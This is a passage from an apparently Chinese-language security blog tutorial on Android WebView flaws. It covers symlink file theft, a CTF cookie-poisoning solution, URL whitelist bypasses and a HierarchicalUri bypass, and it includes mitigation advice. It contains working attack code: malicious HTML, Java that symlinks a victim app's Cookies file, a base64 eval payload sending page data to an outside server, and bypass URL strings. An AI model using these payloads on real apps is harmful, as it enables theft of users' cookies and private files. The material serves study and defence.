控件；</li><li>避免 App 内部的 WebView 被不信任的第三方调用，排查内置 WebView 的 Activity 是否被导出、必须导出的 Activity 是否会通过参数传递调起内置的WebView等；</li><li>file 域访问为非功能需求时，手动配置 setAllowFileAccessFromFileURLs 或 setAllowUniversalAccessFromFileURLs 两个 API 为 false（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false）；</li></ul><p>若需要开启 file 域访问，则设置 file 路径的白名单，严格控制 file 域的访问范围，具体如下：</p><ul><li>固定不变的 HTML 文件可以放在 assets 或 res 目录下，file:&#x2F;&#x2F;&#x2F;android_asset 和 file:&#x2F;&#x2F;&#x2F;android_res 在不开启 API 的情况下也可以访问；</li><li>可能会更新的 HTML 文件放在 &#x2F;data&#x2F;data&#x2F;(app) 目录下，避免被第三方替换或修改；</li><li>对 file 域请求做白名单限制时，需要对“…&#x2F;…&#x2F;”特殊情况进行处理，避免白名单被绕过。</li></ul><h4 id="（3）符号链接跨源攻击"><a href="#（3）符号链接跨源攻击" class="headerlink" title="（3）符号链接跨源攻击"></a>（3）符号链接跨源攻击</h4><p>我们回顾2020SDC中研究提到的这类漏洞，只有<strong>setAllowFileAccess为True</strong></p><p><strong>漏洞原理：</strong></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/43.png" alt="image-20220729202532795"></p><p>其攻击过程首先是操纵WebView去访问一个攻击APP自己公开出来的网页，然后这个网页执行的内容其实就是延时去读取自身。在延时读取自身的时间窗口内，这个文件悄悄被进行了替换，替换成了软链接，指向受害APP的一个私有文件，最终读取窃取其内容。</p><p>具体攻击步骤:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（在该命令执行前 xx.html 是不存在的；执行完这条命令之后，就生成了这个文件，并且将 Cookie 文件链接到了 xx.html 上。）</span><br><span class="line"><span class="number">1.</span> 把恶意的 js 代码输出到攻击应用的目录下，随机命名为 xx.html，修改该目录的权限；\</span><br><span class="line"><span class="number">2.</span> 修改后休眠 1s，让文件操作完成；\</span><br><span class="line"><span class="number">3.</span> 完成后通过系统的 Chrome 应用去打开该 xx.html 文件\</span><br><span class="line"><span class="number">4.</span> 等待 4s 让 Chrome 加载完成该 html，最后将该 html 删除，并且使用 ln -s 命令为 Chrome 的 Cookie 文件创建软连接，\</span><br><span class="line">于是就可通过链接来访问 Chrome 的 Cookie</span><br></pre></td></tr></table></figure><p><strong>漏洞复现：</strong></p><p>这里由于该漏洞在Android7.0版本上已经修复了，所以这里我引用大佬的博客来进行描述，大家具体可以按照步骤在Android7.0以下的版本上去复现，参考文章：<a href="https://blog.csdn.net/qq_35993502/article/details/121371049">Android安全检测－WebView File域同源策略绕过漏洞</a></p><p>构造HTML文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#恶意<span class="variable constant_">APP</span>的<span class="variable constant_">HTML</span>,被检测<span class="variable constant_">APP</span>加载此html，执行<span class="variable constant_">JS</span>代码</span><br><span class="line">&lt;html&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">var d = document;</span></span><br><span class="line"><span class="language-xml">function loadDatabase()</span></span><br><span class="line"><span class="language-xml">&#123;</span></span><br><span class="line"><span class="language-xml">    var file_url = d.URL;</span></span><br><span class="line"><span class="language-xml">    var xmlhttp =new XMLHttpRequest();</span></span><br><span class="line"><span class="language-xml">    xmlhttp.onload=function() &#123;</span></span><br><span class="line"><span class="language-xml"> document.body.appendChild(d.createTextNode(xmlhttp.responseText))</span></span><br><span class="line"><span class="language-xml">    alert(xmlhttp.responseText);</span></span><br><span class="line"><span class="language-xml">    &#125;</span></span><br><span class="line"><span class="language-xml">    xmlhttp.open(&quot;GET&quot;,file_url);</span></span><br><span class="line"><span class="language-xml">    xmlhttp.send(null);</span></span><br><span class="line"><span class="language-xml">&#125;</span></span><br><span class="line"><span class="language-xml">setTimeout(loadDatabase(),8000); #延迟8秒执行。利用时间差和软链接来获取被攻击APP的私有文件</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>构造恶意APP的攻击代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#恶意APP的攻击代码</span><br><span class="line">  <span class="keyword">try</span> &#123; </span><br><span class="line">  <span class="type">String</span> <span class="variable">HTML</span> <span class="operator">=</span> <span class="string">&quot;恶意APP的HTML,在上面的HTML代码&quot;</span>;</span><br><span class="line">  #新建文件夹，用于存放恶意HTML文件</span><br><span class="line">       cmdexec(<span class="string">&quot;mkdir /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">       #将恶意HTML到恶意APP的沙盒目录</span><br><span class="line">        cmdexec(<span class="string">&quot;echo \&quot;&quot;</span> + HTML + <span class="string">&quot;\&quot; &gt;  /data/data/mm.xxxxx.testdemo3/files/attack.html&quot;</span>);</span><br><span class="line">        #授权目录及其文件权限，允许其它应用访问</span><br><span class="line">        cmdexec(<span class="string">&quot;chmod -R 777 /data/data/mm.xxxxx.testdemo3/files&quot;</span>);</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        #启动被攻击的APP，并携带恶意HTML</span><br><span class="line">        <span class="title function_">invokeVulnAPP</span><span class="params">(<span class="string">&quot;file://&quot;</span> + HTML_PATH)</span>;</span><br><span class="line">        #延时<span class="number">6</span>秒</span><br><span class="line">        Thread.sleep(<span class="number">6000</span>);</span><br><span class="line">        #删除HTML文件</span><br><span class="line">        cmdexec(<span class="string">&quot;rm &quot;</span> + HTML_PATH);</span><br><span class="line">        #软链接文件，实现读取被攻击应用的<span class="keyword">private</span>.txt文件</span><br><span class="line">        cmdexec(<span class="string">&quot;ln -s &quot;</span> + <span class="string">&quot;/data/data/mm.xxxxx.testdemo3/files/private.txt&quot;</span> + <span class="string">&quot; &quot;</span> + HTML_PATH);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      <span class="comment">// <span class="doctag">TODO:</span> handle exception</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目标样本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#被攻击的APP，有漏洞的代码</span><br><span class="line"><span class="type">WebView</span> <span class="variable">webView</span> <span class="operator">=</span> findViewById(R.id.webview);</span><br><span class="line">webView.getSettings().setJavaScriptEnabled(<span class="literal">true</span>);</span><br><span class="line">webView.getSettings().setAllowFileAccess(<span class="literal">true</span>);  允许加载File域</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">if</span> (i != <span class="literal">null</span>) &#123;</span><br><span class="line">     mUri = i.getData(); #取出了恶意HTML</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (mUri != <span class="literal">null</span>) &#123;</span><br><span class="line">    url = mUri.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (url != <span class="literal">null</span>) &#123;</span><br><span class="line">    webView.loadUrl(url); #加载了恶意HTML</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现效果：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/36.png" alt="image-20220729205923022"></p><p><strong>安全防护：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、设置setAllowFileAccess方法为<span class="literal">false</span>,设置setAllowFileAccessFromFileURLs和setAllowUniversalAccessFromFileURLs为<span class="literal">false</span>。</span><br><span class="line"><span class="number">2</span>、在Android4<span class="number">.0</span>(API15)及以下得采用其他方法进行手动校验是否访问file域</span><br><span class="line"><span class="number">3</span>、当WebView所在Activity存在组件暴露时，若不是必要的组件暴露，应该禁止组件暴露</span><br></pre></td></tr></table></figure><h4 id="（4）污染Cooike漏洞"><a href="#（4）污染Cooike漏洞" class="headerlink" title="（4）污染Cooike漏洞"></a>（4）污染Cooike漏洞</h4><p>本漏洞参考：<a href="http://www.ctfiot.com/39656.html">Android-Webview中的漏洞利用总结</a></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/44.png" alt="image-20220729210229976"></p><p><strong>漏洞原理：</strong></p><p>攻击者创造符号链接，然后绕过校验，访问攻击的html，再通过软链接去加载symlink.html，然后窃取Cooike，如下图所示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/74.png" alt="image-20220730141203355"></p><p><strong>漏洞复现：</strong></p><p>首先创建了符号链接，然后过URL校验，访问我们的服务器<code>http://ip地址/easydroid.html</code>:</p><p>建立一个easydroid.html，它里面有两个重定向：一个是设置Cookie，一个是加载与Cookies文件符号链接后的那个html文件</p><p><code>easydroid.html</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>evil<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>injected cookie with xss<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">cookie</span> = <span class="string">&quot;sendData = &#x27;&lt;img src=\&quot;evil\&quot; onerror=\&quot;eval(atob(&#x27;dmFyIGJhc2VVcmwgPSAiaHR0cDovLzEwLjcuODkuMTA4L015VGVzdC9SZWNlaXZlU2VydmxldD8iCm5ldyBJbWFnZSgpLnNyYyA9IGJhc2VVcmwgKyAiY29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpOw==&#x27;))\&quot;&gt;&#x27;&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> baseUrl = <span class="string">&quot;http://****/MyTest/ReceiveServlet?&quot;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span> = baseUrl + <span class="string">&quot;cookie=&quot;</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">&quot;open evil page.&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">     <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">         location.<span class="property">href</span> = <span class="string">&#x27;intent:#Intent;component=com.bytectf.easydroid/.TestActivity;S.url=file%3A%2Fdata%2Fuser%2F0%2Fcom.bytectf.pwneasydroid%2Fsymlink.html;end&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">     &#125;, <span class="number">40000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_main);</span><br><span class="line">    symlink();</span><br><span class="line">    Intent intent \= <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    intent.setClassName(<span class="string">&quot;com.bytectf.easydroid&quot;</span>,<span class="string">&quot;com.bytectf.easydroid.MainActivity&quot;</span>);</span><br><span class="line">    intent.setData(Uri.parse(<span class="string">&quot;http://toutiao.com@****/easydroid.html&quot;</span>));</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">symlink</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    String root \= getApplicationInfo().dataDir;</span><br><span class="line">    String symlink \= root + <span class="string">&quot;/symlink.html&quot;</span>;</span><br><span class="line">    String cookies \= getPackageManager().getApplicationInfo(<span class="string">&quot;com.bytectf.easydroid&quot;</span>, <span class="number">0</span>).dataDir + <span class="string">&quot;/app_webview/Cookies&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;rm &quot;</span> + symlink).waitFor();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;ln -s &quot;</span> + cookies + <span class="string">&quot; &quot;</span> + symlink).waitFor();</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">&quot;chmod -R 777 &quot;</span> + root).waitFor();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> symlink;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Throwable th) &#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(th);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过Intent重定向，首先加载exp.html来设置cookie，然后再加载symlink.html，将所要Cookies内容返回给我们的服务器。最终达到窃取Cookies的目的。注意，这里要保证setAllowFileAccess(true)，API 29以下默认为true，否则会利用失败</p><p>效果显示：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/75.png" alt="image-20220730141455146"></p><h3 id="3-URL配置漏洞"><a href="#3-URL配置漏洞" class="headerlink" title="3.URL配置漏洞"></a>3.URL配置漏洞</h3><p>在WebView漏洞中，许多URL可以通过各种方式去绕过验证，从而引起各式各样的漏洞</p><p>URL的结构如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://login:password@address:port/path/to/resource/?query_string#fragment</span><br></pre></td></tr></table></figure><ul><li>scheme<br>不区分大小写，包括http、https、file、ftp等等,:之后的“&#x2F;&#x2F;”可省略，例如http:<a href="http://www.qq.com/">www.qq.com</a>, 此外，多数浏览器在scheme之前加空格也是可以正常解析的</li><li>login:password@（认证信息）<br>服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个不常见字段往往可以绕过很多检查</li><li>address<br>address字段可以是一个不区分大小写的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法</li><li>port<br>端口号</li><li>&#x2F;path&#x2F;to&#x2F;resource<br>层级路径，可以使用“..&#x2F;”到上一级目录</li><li>query_string<br>查询字符串，格式为”query_string?name1&#x3D;value1&amp;name2&#x3D;value2”</li><li>fragment<br>用于html中的页面定位</li></ul><h4 id="（1）URL绕过漏洞"><a href="#（1）URL绕过漏洞" class="headerlink" title="（1）URL绕过漏洞"></a>（1）URL绕过漏洞</h4><p><strong>漏洞原理：</strong></p><h5 id="lt-1-gt-通用的URL绕过"><a href="#lt-1-gt-通用的URL绕过" class="headerlink" title="&lt;1&gt;通用的URL绕过"></a>&lt;1&gt;通用的URL绕过</h5><p>首先我们来看一个简单的url校验例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(checkDomain(url))&#123;</span><br><span class="line">enableJavaScriptInterface();</span><br><span class="line"><span class="comment">//或者webview.load(url)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是对url进行域名校验，然后开启我们的<code>enableJavaScriptInterface</code>接口可以访问js文件</p><p>我们在实际中会发现这样的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(url.startsWith(<span class="string">&quot;file://&quot;</span>))&#123;</span><br><span class="line">setJavaScriptEnbled(<span class="literal">false</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">setJavaScriptEnbled(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显这里是开发者为了防止加载file的同源策略进行的防护，但是我们有很多的绕过方法：</p><p>总结：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) 大写字母 “File:<span class="comment">//”</span></span><br><span class="line">(<span class="number">2</span>) 前面加上空格： “ file:<span class="comment">//”</span></span><br><span class="line">(<span class="number">3</span>) 字符编码：“file：%<span class="number">2F</span>/”</span><br><span class="line">(<span class="number">4</span>) 可正常访问的畸形路径：“file:sdcard/attack/html” 或 “file:/\<span class="comment">//sdcard/attack.html”</span></span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-常见的url校验"><a href="#lt-2-gt-常见的url校验" class="headerlink" title="&lt;2&gt; 常见的url校验"></a>&lt;2&gt; 常见的url校验</h5><p>我们还可以发现在一般的url中会对首尾进行校验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.endsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">enableJavascriptInterface();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在问题：endWith未闭合点号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">绕过：evilmysite.com</span><br><span class="line">修复：endsWith(<span class="string">&quot;.mysite.com&quot;</span>)</span><br></pre></td></tr></table></figure><p>使⽤startsWith、contains、indexOf、正则匹配等⾮严格字符串匹配</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(host.startsWith(<span class="string">&quot;mysite.com&quot;</span>))&#123;</span><br><span class="line">enableJavascriptInterface();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">绕过：mysite.com@oppo.com</span><br></pre></td></tr></table></figure><p><strong>contains+indexOf绕过：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">任何可以添加字符串的字段</span><br><span class="line">子域名 huawei.com.mysite.com</span><br><span class="line">子路径 mysite.com/huawei.com</span><br><span class="line">参数 mysite.com/xxxx#huawei.com</span><br></pre></td></tr></table></figure><p><strong>&#x2F;&#x2F;和第一个&#x2F;之间提取host</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkDomain</span><span class="params">(String inputUrl)</span></span><br><span class="line">&#123;</span><br><span class="line">    String[] whiteList=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;huawei.com&quot;</span>,<span class="string">&quot;hicloud.com&quot;</span>&#125;;</span><br><span class="line">    String tempStr=inputUrl.replace(<span class="string">&quot;://&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    String inputDomain=tempStr.substring(<span class="number">0</span>,tempStr.indexOf(<span class="string">&quot;/&quot;</span>)); <span class="comment">//提取host</span></span><br><span class="line">    <span class="keyword">for</span> (String whiteDomain:whiteList)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputDomain.indexOf(whiteDomain)&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">子域名 huawei.com.mysite.com</span><br><span class="line">http:<span class="comment">//huawei.com@www.rebeyond.net/poc.htm</span></span><br><span class="line">http:<span class="comment">//a:a@www.huawei.com:b@www.baidu.com 在android中使用getHost获取到的是huawei.com,但实际访问的是baidu.com</span></span><br></pre></td></tr></table></figure><p><strong>漏洞复现：</strong></p><p>我们打开一个样本APP，分析其代码块：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/45.png" alt="image-20220729211137555"></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/46.png" alt="image-20220729211156801"></p><p>这里我们可以简单的发现代码对URL的相应部分进行了校验，这样我们就可以进行构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;insecureshop://com.insecureshop/web?url=https://www.baidu.com&quot;</span><br><span class="line">&quot;insecureshop://com.insecureshop/webview?url=http://www.baidu.com?-insecureshopapp.com&quot;</span><br></pre></td></tr></table></figure><p>我们构造了两条URL，然后可以绕过检验，然后我们直接启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -W -a android.intent.action.VIEW -d URI的值</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0020/47.png" alt="image-20220729211417226"></p><p>这里我们可以实现任意的URI的访问和跳转</p><h4 id="（2）hearachical-Uri绕过"><a href="#（2）hearachical-Uri绕过" class="headerlink" title="（2）hearachical Uri绕过"></a>（2）hearachical Uri绕过</h4><p>假设我们加载的Uri不是通过Uri.parse，而是通过外部直接获取，我们可以构造hearachical  来绕过</p><p>我们可以使用 HierarchicalUri 和 Java Reflection API 进行攻击，同样我们分析一个样本的URL验证</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line">   <span class="type">boolean</span> <span class="variable">isValidUrl</span> <span class="operator">=</span> <span class="string">&quot;https&quot;</span>.equals(uri.getScheme()) &amp;&amp; uri.getUserInfo() == <span class="literal">null</span> &amp;&amp; <span class="string">&quot;legitimate.com&quot;</span>.equals(uri.getHost());</span><br><span class="line">   <span class="keyword">if</span> (isValidUrl) &#123;</span><br><span class="line">       webView.loadUrl(uri.toString(), getAuthHeaders());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>android.net.Uri</code>在Android上被广泛使用，但实际上它是一个抽象类。<code>android.net.Uri$HierarchicalUri</code>是它的子类之一。Java 反射 API 使创建能够绕过此检查的 Uri 成为可能。</p><p>通过反射传⼊⼀个scheme、authoritiy和path，构造⼀个形式为<a href="http://legitimate.com@attacker.com的hierachicaluri实例即可绕过/">http://legitimate.com@attacker.com的HierachicalUri实例即可绕过</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line"></span><br><span class="line">            Uri uri;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">//java反射获取类引用</span></span><br><span class="line">                <span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">                hierarchicalUriConstructor.setAccessible(<span 